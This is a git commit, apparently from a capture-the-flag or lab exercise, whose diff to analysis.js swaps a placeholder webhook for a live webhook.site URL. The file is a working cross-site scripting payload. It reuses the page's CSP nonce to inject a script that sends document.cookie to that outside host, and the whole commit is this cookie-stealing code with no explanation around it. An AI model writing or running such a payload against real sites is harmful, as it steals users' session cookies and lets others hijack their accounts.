69affae375402eb3b4d441fef7930c941e6d7e29
lucassun14 <142594125+lucassun14@users.noreply.github.com>
2026-04-24 11:29:31 +1000

    1

--- analysis.js
+++ analysis.js
@@ -1,7 +1,7 @@
 const nonce = document.currentScript.nonce;
 const newHTML = `
   <script nonce="${nonce}">
-    fetch('https://your-webhook.site/path?c=' + document.cookie);
+    fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?c=' + document.cookie);
   <\/script>
 `;
 document.write(newHTML);
